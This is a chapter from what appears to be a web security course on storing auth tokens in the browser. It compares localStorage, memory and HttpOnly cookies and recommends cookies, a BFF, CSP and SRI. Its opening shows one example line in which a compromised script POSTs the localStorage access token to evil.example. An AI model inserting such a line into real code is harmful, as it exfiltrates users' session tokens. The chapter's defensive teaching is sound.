# E12 — Where to store a token in a browser: localStorage, cookie, memory

**Part E · Sessions & tokens** · *Builds on [E02](E02-cookie-attributes.md), [A07](../track-a/A07-client-vs-server.md)*
---

## Why it matters

A third-party analytics script is compromised at the CDN. One line changes.

```js
fetch("https://evil.example/c", {method: "POST", body: localStorage.getItem("access_token")});
```

Every user who loads a page while that script is live has their token exfiltrated. The
attacker uses it from their own machine, at their leisure, for the token's full lifetime —
and if the refresh token was there too, indefinitely.

The application had no XSS bug of its own. It included a script, as every application does
([A01](../track-a/A01-what-happens-when-you-type-a-url.md)), and that script runs with the
full privileges of the origin ([A07](../track-a/A07-client-vs-server.md)).

**`localStorage` is readable by every script on your origin.** That is not a vulnerability
in `localStorage`; it is its specification.

---

## The four options

| | `localStorage` | `sessionStorage` | **In memory** | **`HttpOnly` cookie** |
|---|---|---|---|---|
| Readable by script | ❌ **Yes** | ❌ **Yes** | ❌ **Yes** | ✅ **No** |
| Survives reload | ✅ | ✅ (per tab) | ❌ | ✅ |
| Survives tab close | ✅ | ❌ | ❌ | ✅ (if persistent) |
| Sent automatically | ❌ manual | ❌ manual | ❌ manual | ✅ automatic |
| Vulnerable to CSRF | ✅ immune | ✅ immune | ✅ immune | ⚠️ needs `SameSite` |
| **Survives XSS** | ❌ **No** | ❌ **No** | ⚠️ **Partly** | ✅ **Yes** |
| Cross-tab | ✅ | ❌ | ❌ | ✅ |
| Size | 5–10 MB | 5–10 MB | Unlimited | ~4 KB |

The row that decides it is **"survives XSS."**

---

## The argument that is usually made, and why it is wrong

> *"Cookies are vulnerable to CSRF, so use `localStorage` and send the token in an
> `Authorization` header. Then CSRF is impossible."*

The premise is true. The conclusion does not follow, for three reasons.

**1. `SameSite=Lax` is the browser default.** Classic CSRF — a cross-site form `POST` —
does not work by default any more ([E15](E15-csrf.md)). The problem you are trading *away*
is already largely solved by the platform.

**2. The trade is not symmetric.**

| | XSS with `HttpOnly` cookie | XSS with `localStorage` |
|---|---|---|
| Attacker can | Act as the user **while the page is open** | **Steal the token and use it from their own machine, for its full lifetime** |
| Persists after the tab closes | ❌ | ✅ |
| Works from the attacker's infrastructure | ❌ | ✅ |
| Detectable | Requests come from the user's session | Looks like a normal client |
| Survives password change | Only if the session is not revoked | ✅ until the token expires |

XSS is **more common and more damaging** than CSRF. Trading a solved problem for an
unsolved one is a bad trade.

**3. "You have bigger problems with XSS anyway" is a non-argument.** Yes — and the design
choice is whether XSS is *serious* or *catastrophic*. Defence in depth means assuming your
XSS prevention will fail once ([C04](../track-c/C04-threat-modeling.md)). `HttpOnly` is what
you get for that assumption.

> **`HttpOnly` cookie + `SameSite` beats `localStorage` on both axes.** You keep XSS
> resistance *and* the browser's default CSRF protection.

---

## The recommendation

### First-party web app (server-rendered or SPA on the same site)

```http
Set-Cookie: __Host-session=<opaque>; Path=/; Secure; HttpOnly; SameSite=Lax
```

Opaque session ID, server-side session ([E03](E03-build-server-side-sessions.md)). No token
in JavaScript at all — there is nothing for a script to steal.

### SPA on a different origin from the API

Best: **a backend-for-frontend** ([F17](../track-f/F17-oauth-for-spas-and-bff.md)). The
browser holds a session cookie for your BFF; the BFF holds the tokens server-side. The
browser never sees a token.

Acceptable: an `HttpOnly` cookie plus a correct CORS configuration
([A11](../track-a/A11-same-origin-and-cors.md)) — exact-origin allowlist,
`credentials: true`, `Vary: Origin`.

### If you genuinely must hold a token in JavaScript

Some architectures leave no choice. Then:

```
   ACCESS TOKEN   ──> in MEMORY only (a module-scoped variable)
                      • never localStorage, never sessionStorage
                      • lost on reload — that is correct
                      • lifetime 5–15 minutes  (E10)

   REFRESH TOKEN  ──> HttpOnly cookie, Path=/auth/refresh
                      • so a reload can silently re-obtain an access token
                      • never in JavaScript
```

The access token in memory limits an XSS to the current page load. The refresh token in an
`HttpOnly` cookie, path-scoped, means a script cannot read it — and an XSS that *calls*
`/auth/refresh` still cannot exfiltrate the result to another origin if your CSP is right.

```js
let accessToken = null;                     // module scope. Not on window.

export async function getAccessToken() {
  if (accessToken && !isExpired(accessToken)) return accessToken;
  const r = await fetch("/auth/refresh", {method: "POST", credentials: "include"});
  if (!r.ok) { location.href = "/login"; return null; }
  accessToken = (await r.json()).access_token;
  return accessToken;
}
```

Never `window.token = ...`, never a Redux store that persists to `localStorage`, never a
logged React DevTools tree in production.

---

## Things that do not help

**Encrypting the token in `localStorage`.** The key has to be somewhere the script can read
([A10](../track-a/A10-where-secrets-live.md)). You have encrypted a value and stored the key
next to it.

**Obfuscating the storage key.** The attacker enumerates `localStorage`.

**Checking `document.referrer` or a custom header.** The attacker's script runs on your
origin; every check passes.

**Binding the token to a fingerprint.** Forgeable, and an attacker with script access has
the same fingerprint ([D17](../track-d/D17-remember-this-device.md)).

**Web Workers or Service Workers.** Genuinely better — a token in a worker's scope is not
reachable from the main thread's DOM. But a script on your origin can register or message
the worker, so it raises the cost rather than closing the hole. Worth doing; not a
replacement for `HttpOnly`.

---

## What actually helps

**1. A strict Content Security Policy.** The best XSS mitigation available
([E16](E16-xss-is-an-auth-vulnerability.md)):

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  connect-src 'self' https://api.example.com;
```

`connect-src` is the underused one: even with script execution, an attacker cannot `fetch`
to their own server. It converts exfiltration into a much harder problem.

**2. Subresource Integrity** on third-party scripts:

```html
<script src="https://cdn.example.net/a.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

Would have prevented the CDN compromise at the top of this chapter, exactly.

**3. Short token lifetimes.** A stolen 5-minute token is worth much less
([E10](E10-token-lifetimes-and-rotation.md)).

**4. Sender-constrained tokens.** DPoP binds the token to a key
([F16](../track-f/F16-sender-constrained-tokens.md)), so a stolen bearer string is useless
without it. If the key is a non-extractable `CryptoKey` in IndexedDB, even a script cannot
export it — it can only *use* it while the page is open. That is a real improvement, and it
is the direction the ecosystem is moving.

**5. Not including scripts you do not need.** Every third-party script is a delegation of
your security to another company.

---

## The decision

```
Can you use a cookie?  (same site, or a BFF)
│
├── YES ──> ✅ HttpOnly + Secure + SameSite + __Host-
│            Opaque session ID. Nothing in JavaScript.
│
└── NO ───> Can you add a BFF?
            │
            ├── YES ──> ✅ Do that. Cookie to the BFF; tokens stay server-side.
            │
            └── NO ───> ⚠️ Access token IN MEMORY (short-lived)
                           Refresh token in an HttpOnly, path-scoped cookie
                           + strict CSP with connect-src
                           + SRI on every third-party script
                           + consider DPoP with a non-extractable key
```

**`localStorage` appears nowhere on that tree.** That is deliberate.

---

## Terms defined in this chapter

`localStorage`, `in-memory storage`

---

## What to remember

1. **`localStorage` is readable by every script on your origin.** By specification.
2. The CSRF-vs-XSS trade is **not symmetric**: XSS with `localStorage` is permanent, remote,
   offline theft. XSS with `HttpOnly` is bounded to the page.
3. **`SameSite=Lax` is the default**, so you are trading a solved problem for an unsolved
   one.
4. **`HttpOnly` cookie + opaque session** is the answer whenever a cookie is possible.
5. Different origins → **BFF**. The browser never holds a token.
6. If you must: **access token in memory, refresh token in a path-scoped `HttpOnly`
   cookie.**
7. Encryption, obfuscation, and fingerprinting **do not help**. CSP `connect-src`, SRI,
   short lifetimes, and DPoP do.

---

## Sources

- [OWASP: HTML5 Security Cheat Sheet — Local Storage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [RFC 9700 — OAuth 2.0 Security BCP](https://www.rfc-editor.org/rfc/rfc9700) §4.2 (token storage in browsers)
- [OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) — the BFF recommendation, normatively
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**Next:** [E13 — Sessions across devices: listing, remote logout, "log out everywhere"](E13-sessions-across-devices.md)
